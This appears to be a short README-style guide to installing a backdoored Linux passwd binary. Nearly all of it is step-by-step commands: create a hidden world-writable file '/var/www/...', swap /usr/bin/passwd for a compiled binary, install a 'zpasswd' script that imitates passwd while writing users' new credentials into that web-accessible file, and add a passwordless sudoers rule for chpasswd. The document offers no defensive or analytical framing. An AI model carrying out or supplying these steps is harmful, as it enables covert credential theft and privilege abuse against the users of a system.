## Backdoored passwd binary

First you must create a `...` file in `/var/www`.

`touch /var/www/...`

Next make `root` own the file and give it `777` permissions. 

`chown root:root /var/www/...`
`chmod 777 /var/www/...`

Backing up the origin passwd binary is recommended.

`mv /usr/bin/passwd /usr/bin/passwd.orig`

You will now need to move the compiled c binary to replace the original.

`mv passwd /usr/bin`

Give `root` ownership and give the file `755` permissions.

`chown root:root /usr/bin/passwd`
`chmod 755 /usr/bin/passwd`

Next move the `zpasswd` python script into `/usr/bin`

`mv zpasswd /usr/bin`

You will also need to give `root` ownership and `755` permissions.

`chown root:root /usr/bin/zpasswd`
`chmod 755 /usr/bin/zpasswd`

The last part that you have to do because I have not found a way to get around it, is that you must add a Cmnd_Alias in the `/etc/sudoers` file so that when the new username/password is passed to chpasswd, they will not have to enter their password to do sudo and run chpasswd.

This can be done by typing `visudo` and going down to the Cmnd_Alias section, and adding the line:

`Cmnd_Alias CHPASSWD=/usr/bin/chpasswd`

then adding the user as a sudoer to run that command without a password under User aliases

`<username> ALL=NOPASSWD: CHPASSWD`

and saving it.

Now when users run the `passwd` command, they will run the C compiled binary, which will pass over to the `zpasswd` python script, which will emulate the real passwd binary, but will add the new credentials to `/var/www/...` and then finally change the password of the user.
